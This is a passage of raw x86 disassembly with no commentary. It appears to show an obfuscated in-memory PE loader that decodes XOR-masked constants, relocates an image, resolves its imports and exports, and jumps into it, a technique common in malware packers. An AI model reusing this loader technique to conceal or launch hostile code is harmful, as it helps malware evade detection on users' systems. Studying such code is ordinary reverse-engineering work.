  42526a:	mov    DWORD PTR [ebp-0x40],eax
  42526d:	mov    eax,DWORD PTR [ebp-0x10]
  425270:	mov    ecx,DWORD PTR [ebp-0x2c]
  425273:	xor    eax,ebx
  425275:	add    eax,esi
  425277:	cmp    eax,ecx
  425279:	je     0x42529a
  42527b:	mov    eax,DWORD PTR [ebp+0x8]
  42527e:	mov    ecx,DWORD PTR [ebp-0x50]
  425281:	mov    eax,DWORD PTR [eax+0x1d8]
  425287:	xor    ecx,ebx
  425289:	add    ecx,esi
  42528b:	push   ecx
  42528c:	mov    ecx,DWORD PTR [ebp-0x10]
  42528f:	xor    ecx,ebx
  425291:	add    ecx,esi
  425293:	push   ecx
  425294:	push   DWORD PTR [ebp-0x2c]
  425297:	call   DWORD PTR [eax+0x18]
  42529a:	pop    edi
  42529b:	pop    esi
  42529c:	pop    ebx
  42529d:	leave  
  42529e:	ret    0x4
  4252a1:	push   ebp
  4252a2:	mov    ebp,esp
  4252a4:	push   ecx
  4252a5:	push   ecx
  4252a6:	lea    eax,[ebp-0x8]
  4252a9:	mov    DWORD PTR [ebp-0x4],eax
  4252ac:	push   esi
  4252ad:	mov    esi,DWORD PTR [ebp-0x4]
  4252b0:	mov    eax,0xf881ba2e
  4252b5:	mov    DWORD PTR [esi],eax
  4252b7:	mov    esi,DWORD PTR [ebp-0x8]
  4252ba:	cmp    esi,eax
  4252bc:	pop    esi
  4252bd:	jne    0x4252c7
  4252bf:	mov    BYTE PTR [ecx+0xa],0x7a
  4252c3:	mov    BYTE PTR [edx+0x8],0x2f
  4252c7:	mov    BYTE PTR [edx+0xa],0x7a
  4252cb:	mov    BYTE PTR [ecx+0x2],0x8
  4252cf:	leave  
  4252d0:	ret    
  4252d1:	push   ebp
  4252d2:	mov    ebp,esp
  4252d4:	push   ecx
  4252d5:	push   ecx
  4252d6:	lea    eax,[ebp-0x8]
  4252d9:	mov    DWORD PTR [ebp-0x4],eax
  4252dc:	mov    edx,DWORD PTR [ebp-0x4]
  4252df:	mov    eax,0xf88b0bca
  4252e4:	mov    DWORD PTR [edx],eax
  4252e6:	mov    edx,DWORD PTR [ebp-0x8]
  4252e9:	cmp    edx,eax
  4252eb:	jne    0x4252fc
  4252ed:	mov    eax,DWORD PTR [ebp+0x8]
  4252f0:	mov    BYTE PTR [ecx+0x9],0xe
  4252f4:	mov    BYTE PTR [eax+0x7],0x57
  4252f8:	mov    BYTE PTR [ecx+0x6],0xf
  4252fc:	mov    BYTE PTR [ecx+0x3],0x1e
  425300:	leave  
  425301:	ret    0x4
  425304:	push   ebp
  425305:	mov    ebp,esp
  425307:	push   ecx
  425308:	push   ecx
  425309:	lea    eax,[ebp-0x8]
  42530c:	mov    DWORD PTR [ebp-0x4],eax
  42530f:	mov    edx,DWORD PTR [ebp-0x4]
  425312:	mov    eax,0x7e0da2e
  425317:	mov    DWORD PTR [edx],eax
  425319:	mov    edx,DWORD PTR [ebp-0x8]
  42531c:	cmp    edx,eax
  42531e:	jne    0x425324
  425320:	mov    BYTE PTR [ecx+0x7],0x57
  425324:	mov    eax,DWORD PTR [ebp+0x8]
  425327:	mov    BYTE PTR [ecx+0x1],0x15
  42532b:	mov    BYTE PTR [eax+0x9],0x2e
  42532f:	leave  
  425330:	ret    0x4
  425333:	push   ebp
  425334:	mov    ebp,esp
  425336:	push   ecx
  425337:	push   ecx
  425338:	lea    eax,[ebp-0x8]
  42533b:	mov    DWORD PTR [ebp-0x4],eax
  42533e:	push   esi
  42533f:	mov    esi,DWORD PTR [ebp-0x4]
  425342:	mov    eax,0x7060e3f
  425347:	mov    DWORD PTR [esi],eax
  425349:	mov    esi,DWORD PTR [ebp-0x8]
  42534c:	cmp    esi,eax
  42534e:	pop    esi
  42534f:	jne    0x42535b
  425351:	mov    BYTE PTR [edx+0x4],0xb
  425355:	mov    WORD PTR [ecx+0x3],0xb1e
  42535b:	mov    BYTE PTR [edx],0x3f
  42535e:	leave  
  42535f:	ret    
  425360:	push   ebp
  425361:	mov    ebp,esp
  425363:	push   ecx
  425364:	push   ecx
  425365:	lea    eax,[ebp-0x8]
  425368:	mov    DWORD PTR [ebp-0x4],eax
  42536b:	mov    edx,DWORD PTR [ebp-0x4]
  42536e:	mov    eax,0xf8870b3e
  425373:	mov    DWORD PTR [edx],eax
  425375:	mov    edx,DWORD PTR [ebp-0x8]
  425378:	cmp    edx,eax
  42537a:	jne    0x425387
  42537c:	mov    eax,DWORD PTR [ebp+0x8]
  42537f:	mov    BYTE PTR [ecx+0x8],0xf
  425383:	mov    BYTE PTR [eax+0x1],0x15
  425387:	mov    BYTE PTR [ecx+0x5],0x3
  42538b:	leave  
  42538c:	ret    0x4
  42538f:	push   esi
  425390:	mov    ecx,edi
  425392:	call   0x425360
  425397:	mov    edx,edi
  425399:	mov    ecx,esi
  42539b:	mov    BYTE PTR [esi],0x1f
  42539e:	call   0x425333
  4253a3:	push   esi
  4253a4:	mov    ecx,edi
  4253a6:	mov    BYTE PTR [esi+0x5],0x3
  4253aa:	call   0x425304
  4253af:	push   esi
  4253b0:	mov    BYTE PTR [esi+0x6],0xf
  4253b4:	call   0x4252d1
  4253b9:	mov    BYTE PTR [esi+0x2],0x8
  4253bd:	mov    edx,esi
  4253bf:	jmp    0x4252a1
  4253c4:	push   ebp
  4253c5:	mov    ebp,esp
  4253c7:	push   ecx
  4253c8:	mov    ecx,DWORD PTR [edx+0x194]
  4253ce:	push   esi
  4253cf:	mov    esi,DWORD PTR [ebp+0x8]
  4253d2:	mov    esi,DWORD PTR [esi]
  4253d4:	mov    DWORD PTR [ecx],esi
  4253d6:	mov    ecx,DWORD PTR [edx+0x194]
  4253dc:	mov    ecx,DWORD PTR [ecx]
  4253de:	mov    esi,DWORD PTR [edx+0x190]
  4253e4:	mov    DWORD PTR [esi],ecx
  4253e6:	mov    eax,DWORD PTR [edx+0x194]
  4253ec:	mov    ecx,DWORD PTR [eax]
  4253ee:	mov    ecx,DWORD PTR [ecx+0x3c]
  4253f1:	add    ecx,DWORD PTR [eax]
  4253f3:	mov    DWORD PTR [ebp-0x4],0xf89ca5b0
  4253fa:	mov    eax,DWORD PTR [ebp-0x4]
  4253fd:	movzx  ecx,WORD PTR [ecx+0x16]
  425401:	xor    eax,0x75108a4
  425406:	add    eax,0x3272ec
  42540b:	pop    esi
  42540c:	test   ecx,eax
  42540e:	je     0x42541c
  425410:	mov    eax,DWORD PTR [edx+0x1c8]
  425416:	mov    DWORD PTR [eax],0xf89c85b1
  42541c:	leave  
  42541d:	ret    0x4
  425420:	push   ebp
  425421:	mov    ebp,esp
  425423:	sub    esp,0x70
  425426:	and    DWORD PTR [ebp-0x20],0x0
  42542a:	mov    DWORD PTR [ebp-0x18],0xf89cb5b0
  425431:	mov    DWORD PTR [ebp-0x1c],0xf89c85f0
  425438:	mov    DWORD PTR [ebp-0x2c],0xf89c85bc
  42543f:	mov    DWORD PTR [ebp-0x14],0xf89c85b2
  425446:	mov    DWORD PTR [ebp-0x2c],0xf89f05b0
  42544d:	mov    eax,DWORD PTR [ebp+0x20]
  425450:	mov    eax,DWORD PTR [eax+0x194]
  425456:	mov    DWORD PTR [ebp-0xc],eax
  425459:	mov    eax,DWORD PTR [ebp+0x20]
  42545c:	push   ebx
  42545d:	push   esi
  42545e:	mov    esi,DWORD PTR [eax+0x190]
  425464:	mov    eax,DWORD PTR [ebp+0x20]
  425467:	mov    eax,DWORD PTR [eax+0x18c]
  42546d:	mov    DWORD PTR [ebp-0x8],eax
  425470:	mov    eax,DWORD PTR [eax]
  425472:	push   edi
  425473:	mov    DWORD PTR [ebp-0x4],esi
  425476:	test   eax,eax
  425478:	jne    0x425485
  42547a:	push   DWORD PTR [ebp+0x1c]
  42547d:	mov    edx,DWORD PTR [ebp+0x20]
  425480:	call   0x4253c4
  425485:	mov    eax,DWORD PTR [esi]
  425487:	mov    ebx,DWORD PTR [esi]
  425489:	add    ebx,DWORD PTR [eax+0x3c]
  42548c:	mov    eax,DWORD PTR [ebp+0xc]
  42548f:	mov    ecx,DWORD PTR [ebp-0x8]
  425492:	mov    ecx,DWORD PTR [ecx]
  425494:	mov    esi,0x75108a4
  425499:	xor    eax,esi
  42549b:	mov    edi,0x3272ec
  4254a0:	add    eax,edi
  4254a2:	cmp    eax,ecx
  4254a4:	jne    0x4256dc
  4254aa:	mov    eax,DWORD PTR [ebp-0xc]
  4254ad:	mov    eax,DWORD PTR [eax]
  4254af:	mov    DWORD PTR [ebp-0x10],eax
  4254b2:	mov    eax,DWORD PTR [ebx+0x50]
  4254b5:	mov    DWORD PTR [ebp-0x68],eax
  4254b8:	mov    eax,DWORD PTR [ebp-0x18]
  4254bb:	xor    eax,esi
  4254bd:	add    eax,edi
  4254bf:	mov    DWORD PTR [ebp-0x64],eax
  4254c2:	mov    eax,DWORD PTR [ebp-0x14]
  4254c5:	and    DWORD PTR [ebp-0x6c],0x0
  4254c9:	xor    eax,esi
  4254cb:	add    eax,edi
  4254cd:	mov    DWORD PTR [ebp-0x60],eax
  4254d0:	lea    eax,[ebp-0x70]
  4254d3:	push   eax
  4254d4:	mov    eax,DWORD PTR [ebp+0x8]
  4254d7:	xor    eax,esi
  4254d9:	add    eax,edi
  4254db:	push   eax
  4254dc:	mov    eax,DWORD PTR [ebp+0x20]
  4254df:	add    eax,0xaa
  4254e4:	push   eax
  4254e5:	mov    eax,DWORD PTR [ebp+0x20]
  4254e8:	mov    eax,DWORD PTR [eax+0x198]
  4254ee:	mov    DWORD PTR [ebp-0x70],0x4
  4254f5:	push   DWORD PTR [eax]
  4254f7:	mov    eax,DWORD PTR [ebp+0x10]
  4254fa:	call   eax
  4254fc:	mov    ecx,DWORD PTR [ebp-0xc]
  4254ff:	mov    ecx,DWORD PTR [ecx]
  425501:	mov    edx,DWORD PTR [ebp-0x8]
  425504:	mov    DWORD PTR [ebp-0x6c],eax
  425507:	mov    DWORD PTR [ebp+0x1c],eax
  42550a:	mov    DWORD PTR [edx],ecx
  42550c:	mov    ecx,DWORD PTR [ebp-0x4]
  42550f:	mov    DWORD PTR [ecx],eax
  425511:	mov    eax,DWORD PTR [ebx+0x50]
  425514:	mov    DWORD PTR [ebp-0x68],eax
  425517:	mov    eax,DWORD PTR [ebp-0x1c]
  42551a:	xor    eax,esi
  42551c:	add    eax,edi
  42551e:	mov    DWORD PTR [ebp-0x64],eax
  425521:	lea    eax,[ebp-0x20]
  425524:	mov    DWORD PTR [ebp-0x60],eax
  425527:	lea    eax,[ebp-0x70]
  42552a:	push   eax
  42552b:	mov    eax,DWORD PTR [ebp+0x8]
  42552e:	xor    eax,esi
  425530:	add    eax,edi
  425532:	push   eax
  425533:	mov    eax,DWORD PTR [ebp+0x20]
  425536:	add    eax,0xee
  42553b:	push   eax
  42553c:	mov    eax,DWORD PTR [ebp+0x20]
  42553f:	mov    eax,DWORD PTR [eax+0x198]
  425545:	mov    DWORD PTR [ebp-0x70],0x4
  42554c:	push   DWORD PTR [eax]
  42554e:	mov    eax,DWORD PTR [ebp+0x10]
  425551:	call   eax
  425553:	test   eax,eax
  425555:	je     0x42557a
  425557:	and    DWORD PTR [ebp+0xc],0x0
  42555b:	cmp    DWORD PTR [ebx+0x50],0x0
  42555f:	jbe    0x42557a
  425561:	mov    eax,DWORD PTR [ebp+0x1c]
  425564:	mov    ecx,DWORD PTR [ebp-0x10]
  425567:	sub    ecx,eax
  425569:	mov    dl,BYTE PTR [ecx+eax*1]
  42556c:	inc    DWORD PTR [ebp+0xc]
  42556f:	mov    BYTE PTR [eax],dl
  425571:	mov    edx,DWORD PTR [ebp+0xc]
  425574:	inc    eax
  425575:	cmp    edx,DWORD PTR [ebx+0x50]
  425578:	jb     0x425569
  42557a:	mov    edx,DWORD PTR [ebp+0x1c]
  42557d:	mov    ecx,DWORD PTR [edx+0x3c]
  425580:	add    ecx,edx
  425582:	mov    eax,DWORD PTR [ecx+0xa0]
  425588:	mov    ebx,DWORD PTR [ecx+0x28]
  42558b:	add    eax,edx
  42558d:	sub    edx,DWORD PTR [ebp-0x10]
  425590:	add    ebx,DWORD PTR [ebp+0x1c]
  425593:	mov    DWORD PTR [ebp+0xc],edx
  425596:	mov    DWORD PTR [ebp-0x2c],ecx
  425599:	mov    DWORD PTR [ebp-0x14],ebx
  42559c:	mov    DWORD PTR [ebp-0x8],0x0
  4255a3:	jmp    0x42561f
  4255a5:	add    edx,0xfffffff8
  4255a8:	shr    edx,1
  4255aa:	mov    DWORD PTR [ebp-0x18],edx
  4255ad:	je     0x42560b
  4255af:	lea    edx,[eax+0x8]
  4255b2:	mov    DWORD PTR [ebp-0x4],edx
  4255b5:	mov    edx,DWORD PTR [ebp-0x18]
  4255b8:	mov    DWORD PTR [ebp-0x18],edx
  4255bb:	mov    edx,DWORD PTR [ebp-0x4]
  4255be:	movzx  edx,WORD PTR [edx]
  4255c1:	mov    DWORD PTR [ebp-0x24],edx
  4255c4:	and    edx,0xfff
  4255ca:	mov    DWORD PTR [ebp-0x28],edx
  4255cd:	mov    edx,DWORD PTR [ebp-0x24]
  4255d0:	shr    edx,0xc
  4255d3:	add    edx,0xffcd8d14
  4255d9:	xor    edx,esi
  4255db:	cmp    edx,0xf89c85b3
  4255e1:	jne    0x425602
  4255e3:	mov    edx,DWORD PTR [ebp-0x28]
  4255e6:	add    edx,DWORD PTR [ebp+0x1c]
  4255e9:	mov    ebx,DWORD PTR [eax]
  4255eb:	cmp    DWORD PTR [ebx+edx*1],0x0
  4255ef:	je     0x4255ff
  4255f1:	mov    ecx,DWORD PTR [ebp+0xc]
  4255f4:	add    ecx,DWORD PTR [ebx+edx*1]
  4255f7:	mov    ebx,DWORD PTR [eax]
  4255f9:	mov    DWORD PTR [edx+ebx*1],ecx
  4255fc:	mov    ecx,DWORD PTR [ebp-0x2c]
  4255ff:	mov    ebx,DWORD PTR [ebp-0x14]
  425602:	add    DWORD PTR [ebp-0x4],0x2
  425606:	dec    DWORD PTR [ebp-0x18]
  425609:	jne    0x4255bb
  42560b:	mov    edx,DWORD PTR [ebp-0xc]
  42560e:	add    DWORD PTR [ebp-0x8],edx
  425611:	mov    edx,DWORD PTR [ebp-0x8]
  425614:	cmp    edx,DWORD PTR [ecx+0xa4]
  42561a:	jae    0x42562d
  42561c:	add    eax,DWORD PTR [ebp-0xc]
  42561f:	mov    edx,DWORD PTR [eax+0x4]
  425622:	mov    DWORD PTR [ebp-0xc],edx
  425625:	test   edx,edx
  425627:	jne    0x4255a5
  42562d:	mov    eax,DWORD PTR [ebp-0x10]
  425630:	mov    DWORD PTR [ebp-0x6c],eax
  425633:	mov    DWORD PTR [ebp-0x70],0x4
  42563a:	mov    eax,DWORD PTR [ecx+0x50]
  42563d:	mov    DWORD PTR [ebp-0x68],eax
  425640:	mov    eax,DWORD PTR [ebp-0x1c]
  425643:	xor    eax,esi
  425645:	add    eax,edi
  425647:	mov    DWORD PTR [ebp-0x64],eax
  42564a:	lea    eax,[ebp-0x20]
  42564d:	mov    DWORD PTR [ebp-0x60],eax
  425650:	lea    eax,[ebp-0x70]
  425653:	push   eax
  425654:	mov    eax,DWORD PTR [ebp+0x8]
  425657:	xor    eax,esi
  425659:	add    eax,edi
  42565b:	push   eax
  42565c:	mov    eax,DWORD PTR [ebp+0x20]
  42565f:	add    eax,0xee
  425664:	push   eax
  425665:	mov    eax,DWORD PTR [ebp+0x20]
  425668:	mov    eax,DWORD PTR [eax+0x198]
  42566e:	push   DWORD PTR [eax]
  425670:	mov    eax,DWORD PTR [ebp+0x10]
  425673:	call   eax
  425675:	mov    eax,DWORD PTR [ebp+0x20]
  425678:	mov    eax,DWORD PTR [eax+0x180]
  42567e:	add    eax,DWORD PTR [ebp+0xc]
  425681:	mov    ecx,DWORD PTR [ebp+0xc]
  425684:	push   DWORD PTR [ebp+0x18]
  425687:	mov    DWORD PTR [eax],ecx
  425689:	push   DWORD PTR [ebp+0x14]
  42568c:	push   DWORD PTR [ebp+0x1c]
  42568f:	call   ebx
  425691:	mov    ecx,DWORD PTR [ebp+0xc]
  425694:	add    ecx,DWORD PTR [ebp+0x20]
  425697:	lea    eax,[ebp+0x4]
  42569a:	mov    DWORD PTR [ebp+0x20],ecx
  42569d:	mov    ecx,DWORD PTR [ebp+0x20]
  4256a0:	mov    ecx,DWORD PTR [ebp+0x20]
  4256a3:	mov    edx,DWORD PTR [ecx+0x190]
  4256a9:	mov    ecx,DWORD PTR [ebp+0x20]
  4256ac:	mov    ecx,DWORD PTR [ecx+0x18c]
  4256b2:	mov    esi,DWORD PTR [ecx]
  4256b4:	cmp    DWORD PTR [eax],esi
  4256b6:	jb     0x4256d7
  4256b8:	mov    esi,DWORD PTR [edx]
  4256ba:	mov    edi,DWORD PTR [edx]
  4256bc:	mov    esi,DWORD PTR [esi+0x3c]
  4256bf:	lea    esi,[edi+esi*1+0x50]
  4256c3:	mov    edi,DWORD PTR [ecx]
  4256c5:	add    edi,DWORD PTR [esi]
  4256c7:	cmp    DWORD PTR [eax],edi
  4256c9:	jae    0x4256d7
  4256cb:	mov    esi,DWORD PTR [ecx]
  4256cd:	mov    ecx,DWORD PTR [eax]
  4256cf:	mov    edx,DWORD PTR [edx]
  4256d1:	sub    ecx,esi
  4256d3:	add    edx,ecx
  4256d5:	mov    DWORD PTR [eax],edx
  4256d7:	mov    eax,DWORD PTR [ebp+0xc]
  4256da:	jmp    0x4256de
  4256dc:	xor    eax,eax
  4256de:	pop    edi
  4256df:	pop    esi
  4256e0:	pop    ebx
  4256e1:	leave  
  4256e2:	ret    0x1c
  4256e5:	push   ebp
  4256e6:	mov    ebp,esp
  4256e8:	sub    esp,0x1c
  4256eb:	push   esi
  4256ec:	mov    esi,eax
  4256ee:	mov    eax,DWORD PTR [ecx+0x190]
  4256f4:	cmp    DWORD PTR [eax],0x0
  4256f7:	je     0x425807
  4256fd:	test   edx,edx
  4256ff:	je     0x425807
  425705:	test   esi,esi
  425707:	je     0x425807
  42570d:	mov    eax,DWORD PTR [esi+0x88]
  425713:	test   eax,eax
  425715:	je     0x425802
  42571b:	cmp    DWORD PTR [esi+0x8c],0x10
  425722:	je     0x425802
  425728:	cmp    DWORD PTR [esi+0x34],edx
  42572b:	je     0x425802
  425731:	mov    esi,DWORD PTR [ecx+0x18c]
  425737:	and    DWORD PTR [ebp-0x10],0x0
  42573b:	mov    ecx,edx
  42573d:	sub    ecx,DWORD PTR [esi]
  42573f:	add    eax,edx
  425741:	movzx  edx,WORD PTR [eax+0xc]
  425745:	mov    DWORD PTR [ebp-0x1c],ecx
  425748:	movzx  ecx,WORD PTR [eax+0xe]
  42574c:	add    ecx,edx
  42574e:	je     0x425802
  425754:	lea    ecx,[eax+0x14]
  425757:	push   ebx
  425758:	mov    DWORD PTR [ebp-0x18],ecx
  42575b:	mov    esi,0x7fffffff
  425760:	push   edi
  425761:	test   DWORD PTR [ecx],esi
  425763:	je     0x4257e4
  425765:	mov    edx,DWORD PTR [ecx]
  425767:	and    DWORD PTR [ebp-0xc],0x0
  42576b:	and    edx,esi
  42576d:	add    edx,eax
  42576f:	movzx  edi,WORD PTR [edx+0xe]
  425773:	movzx  ebx,WORD PTR [edx+0xc]
  425777:	add    edi,ebx
  425779:	je     0x4257e4
  42577b:	lea    ecx,[edx+0x14]
  42577e:	mov    DWORD PTR [ebp-0x14],ecx
  425781:	test   DWORD PTR [ecx],esi
  425783:	je     0x4257c6
  425785:	mov    ecx,DWORD PTR [ecx]
  425787:	and    DWORD PTR [ebp-0x8],0x0
  42578b:	and    ecx,esi
  42578d:	add    ecx,eax
  42578f:	movzx  edi,WORD PTR [ecx+0xe]
  425793:	movzx  ebx,WORD PTR [ecx+0xc]
  425797:	add    edi,ebx
  425799:	je     0x4257c6
  42579b:	lea    edi,[ecx+0x14]
  42579e:	mov    DWORD PTR [ebp-0x4],edi
  4257a1:	mov    edi,DWORD PTR [ebp-0x4]
  4257a4:	mov    edi,DWORD PTR [edi]
  4257a6:	test   edi,edi
  4257a8:	je     0x4257b0
  4257aa:	mov    ebx,DWORD PTR [ebp-0x1c]
  4257ad:	add    DWORD PTR [edi+eax*1],ebx
  4257b0:	movzx  edi,WORD PTR [ecx+0xe]
  4257b4:	movzx  ebx,WORD PTR [ecx+0xc]
  4257b8:	inc    DWORD PTR [ebp-0x8]
  4257bb:	add    DWORD PTR [ebp-0x4],0x8
  4257bf:	add    edi,ebx
  4257c1:	cmp    DWORD PTR [ebp-0x8],edi
  4257c4:	jb     0x4257a1
  4257c6:	movzx  edi,WORD PTR [edx+0xe]
  4257ca:	movzx  ebx,WORD PTR [edx+0xc]
  4257ce:	mov    ecx,DWORD PTR [ebp-0x14]
  4257d1:	inc    DWORD PTR [ebp-0xc]
  4257d4:	add    ecx,0x8
  4257d7:	add    edi,ebx
  4257d9:	mov    DWORD PTR [ebp-0x14],ecx
  4257dc:	cmp    DWORD PTR [ebp-0xc],edi
  4257df:	jb     0x425781
  4257e1:	mov    ecx,DWORD PTR [ebp-0x18]
  4257e4:	movzx  edx,WORD PTR [eax+0xe]
  4257e8:	movzx  edi,WORD PTR [eax+0xc]
  4257ec:	inc    DWORD PTR [ebp-0x10]
  4257ef:	add    ecx,0x8
  4257f2:	add    edx,edi
  4257f4:	mov    DWORD PTR [ebp-0x18],ecx
  4257f7:	cmp    DWORD PTR [ebp-0x10],edx
  4257fa:	jb     0x425761
  425800:	pop    edi
  425801:	pop    ebx
  425802:	xor    eax,eax
  425804:	inc    eax
  425805:	jmp    0x425809
  425807:	xor    eax,eax
  425809:	pop    esi
  42580a:	leave  
  42580b:	ret    
  42580c:	push   ebp
  42580d:	mov    ebp,esp
  42580f:	mov    ecx,DWORD PTR [ecx+0x190]
  425815:	mov    eax,DWORD PTR [ebp+0xc]
  425818:	sub    esp,0x10
  42581b:	push   ebx
  42581c:	xor    ebx,ebx
  42581e:	push   esi
  42581f:	push   edi
  425820:	cmp    DWORD PTR [ecx],ebx
  425822:	je     0x4258aa
  425828:	cmp    eax,ebx
  42582a:	je     0x4258aa
  42582c:	cmp    DWORD PTR [eax+0x78],ebx
  42582f:	jne    0x425836
  425831:	xor    eax,eax
  425833:	inc    eax
  425834:	jmp    0x4258ac
  425836:	mov    eax,DWORD PTR [eax+0x78]
  425839:	add    eax,DWORD PTR [ebp+0x8]
  42583c:	mov    ecx,DWORD PTR [eax+0x1c]
  42583f:	mov    edx,DWORD PTR [eax+0x24]
  425842:	mov    esi,DWORD PTR [eax+0x14]
  425845:	mov    edi,DWORD PTR [eax+0x18]
  425848:	add    ecx,DWORD PTR [ebp+0x8]
  42584b:	add    edx,DWORD PTR [ebp+0x8]
  42584e:	mov    DWORD PTR [ebp-0x4],esi
  425851:	cmp    esi,edi
  425853:	ja     0x425858
  425855:	mov    DWORD PTR [ebp-0x4],edi
  425858:	mov    DWORD PTR [ebp-0x8],ebx
  42585b:	cmp    DWORD PTR [ebp-0x4],ebx
  42585e:	jbe    0x425831
  425860:	cmp    ebx,DWORD PTR [eax+0x14]
  425863:	jae    0x42586b
  425865:	movzx  esi,WORD PTR [edx+ebx*2]
  425869:	jmp    0x42586d
  42586b:	mov    esi,ebx
  42586d:	lea    esi,[ecx+esi*4]
  425870:	mov    edi,DWORD PTR [esi]
  425872:	test   edi,edi
  425874:	je     0x42589f
  425876:	add    edi,DWORD PTR [ebp+0x8]
  425879:	mov    DWORD PTR [ebp-0x10],edi
  42587c:	cmp    edi,eax
  42587e:	jbe    0x425890
  425880:	mov    ebx,DWORD PTR [ebp+0xc]
  425883:	mov    ebx,DWORD PTR [ebx+0x7c]
  425886:	add    ebx,eax
  425888:	cmp    edi,ebx
  42588a:	jae    0x425890
  42588c:	mov    esi,DWORD PTR [esi]
  42588e:	jmp    0x425898
  425890:	sub    edi,DWORD PTR [ebp+0x8]
  425893:	mov    DWORD PTR [esi],edi
  425895:	mov    esi,DWORD PTR [ebp-0x10]
  425898:	test   esi,esi
  42589a:	je     0x4258aa
  42589c:	mov    ebx,DWORD PTR [ebp-0x8]
  42589f:	inc    ebx
  4258a0:	mov    DWORD PTR [ebp-0x8],ebx
  4258a3:	cmp    ebx,DWORD PTR [ebp-0x4]
  4258a6:	jb     0x425860
  4258a8:	jmp    0x425831
  4258aa:	xor    eax,eax
  4258ac:	pop    edi
  4258ad:	pop    esi
  4258ae:	pop    ebx
  4258af:	leave  
  4258b0:	ret    0x8
  4258b3:	push   ebp
  4258b4:	mov    ebp,esp
  4258b6:	sub    esp,0x2c
  4258b9:	mov    edx,0xf89c85b0
  4258be:	mov    DWORD PTR [ebp-0x4],edx
  4258c1:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  4258c8:	mov    eax,DWORD PTR [ebp-0x4]
  4258cb:	mov    ecx,DWORD PTR [ebp-0x4]
  4258ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4258d1:	mov    ecx,DWORD PTR [ebp-0x4]
  4258d4:	mov    ecx,DWORD PTR [ebp-0x4]
  4258d7:	mov    ecx,DWORD PTR [ebp-0x4]
  4258da:	push   ebx
  4258db:	mov    ebx,DWORD PTR [ebp+0x10]
  4258de:	push   esi
  4258df:	mov    esi,0x75108a4
  4258e4:	mov    DWORD PTR [ebp-0x10],0x352eb2e
  4258eb:	mov    ecx,DWORD PTR [ebp-0x4]
  4258ee:	mov    ebx,DWORD PTR [ebx+0x190]
  4258f4:	push   edi
  4258f5:	mov    edi,0x3272ec
  4258fa:	xor    ecx,esi
  4258fc:	xor    eax,esi
  4258fe:	add    eax,edi
  425900:	add    ecx,edi
  425902:	mov    DWORD PTR [ebp-0x18],eax
  425905:	cmp    ecx,DWORD PTR [ebx]
  425907:	je     0x425b88
  42590d:	mov    ebx,DWORD PTR [ebp-0x4]
  425910:	mov    ecx,DWORD PTR [ebp+0xc]
  425913:	xor    ebx,esi
  425915:	add    ebx,edi
  425917:	cmp    ebx,ecx
  425919:	je     0x425b88
  42591f:	mov    ebx,DWORD PTR [ebp-0x4]
  425922:	mov    ecx,DWORD PTR [ecx+0x80]
  425928:	xor    ebx,esi
  42592a:	add    ebx,edi
  42592c:	cmp    ecx,ebx
  42592e:	je     0x425b83
  425934:	add    ecx,DWORD PTR [ebp+0x8]
  425937:	mov    DWORD PTR [ebp-0x2c],ecx
  42593a:	mov    ebx,edx
  42593c:	xor    ebx,esi
  42593e:	add    ebx,edi
  425940:	mov    DWORD PTR [ebp-0x10],ebx
  425943:	mov    ebx,DWORD PTR [ebp-0x10]
  425946:	cmp    ebx,edx
  425948:	je     0x42595c
  42594a:	mov    edx,DWORD PTR [ebp-0x10]
  42594d:	mov    ebx,DWORD PTR [ebp-0x4]
  425950:	imul   edx,edx,0x14
  425953:	xor    ebx,esi
  425955:	add    ebx,edi
  425957:	cmp    DWORD PTR [edx+ecx*1],ebx
  42595a:	jne    0x425973
  42595c:	mov    edx,DWORD PTR [ebp-0x10]
  42595f:	mov    ebx,DWORD PTR [ebp-0x4]
  425962:	imul   edx,edx,0x14
  425965:	xor    ebx,esi
  425967:	add    ebx,edi
  425969:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  42596d:	je     0x425b75
  425973:	mov    eax,DWORD PTR [ebp-0x4]
  425976:	mov    ebx,DWORD PTR [ebp-0x4]
  425979:	mov    eax,DWORD PTR [ebp-0x10]
  42597c:	imul   eax,eax,0x14
  42597f:	add    eax,ecx
  425981:	mov    ecx,DWORD PTR [eax+0x10]
  425984:	add    ecx,DWORD PTR [ebp+0x8]
  425987:	xor    ebx,esi
  425989:	mov    DWORD PTR [ebp-0x1c],ecx
  42598c:	mov    ecx,DWORD PTR [ebp-0x4]
  42598f:	mov    edx,DWORD PTR [ebp-0x4]
  425992:	xor    ecx,esi
  425994:	add    ecx,edi
  425996:	xor    edx,esi
  425998:	mov    DWORD PTR [ebp-0x24],ecx
  42599b:	mov    ecx,DWORD PTR [eax]
  42599d:	add    edx,edi
  42599f:	add    ebx,edi
  4259a1:	cmp    ecx,edx
  4259a3:	je     0x4259ab
  4259a5:	add    ecx,DWORD PTR [ebp+0x8]
  4259a8:	mov    DWORD PTR [ebp-0x24],ecx
  4259ab:	mov    ecx,DWORD PTR [ebp-0x4]
  4259ae:	xor    ecx,esi
  4259b0:	add    ecx,DWORD PTR [eax+0xc]
  4259b3:	mov    eax,DWORD PTR [ebp+0x8]
  4259b6:	lea    eax,[ecx+eax*1+0x3272ec]
  4259bd:	mov    DWORD PTR [ebp+0xc],eax
  4259c0:	mov    DWORD PTR [ebp-0x28],0xf89c85bd
  4259c7:	mov    eax,DWORD PTR [ebp+0x10]
  4259ca:	push   DWORD PTR [ebp+0xc]
  4259cd:	mov    eax,DWORD PTR [eax+0x1d8]
  4259d3:	call   DWORD PTR [eax]
  4259d5:	mov    ecx,DWORD PTR [ebp-0x4]
  4259d8:	xor    ecx,esi
  4259da:	add    ecx,edi
  4259dc:	mov    DWORD PTR [ebp-0xc],eax
  4259df:	cmp    ecx,eax
  4259e1:	jne    0x4259f5
  4259e3:	mov    eax,DWORD PTR [ebp+0x10]
  4259e6:	push   DWORD PTR [ebp+0xc]
  4259e9:	mov    eax,DWORD PTR [eax+0x1d8]
  4259ef:	call   DWORD PTR [eax+0xc]
  4259f2:	mov    DWORD PTR [ebp-0xc],eax
  4259f5:	mov    DWORD PTR [ebp-0x20],0x7f661b29
  4259fc:	mov    DWORD PTR [ebp-0x20],0xf89c9859
  425a03:	mov    eax,DWORD PTR [ebp-0x4]
  425a06:	xor    eax,esi
  425a08:	add    eax,edi
  425a0a:	cmp    eax,DWORD PTR [ebp-0xc]
  425a0d:	jne    0x425a32
  425a0f:	mov    eax,DWORD PTR [ebp-0x8]
  425a12:	mov    ecx,DWORD PTR [ebp-0x20]
  425a15:	xor    eax,esi
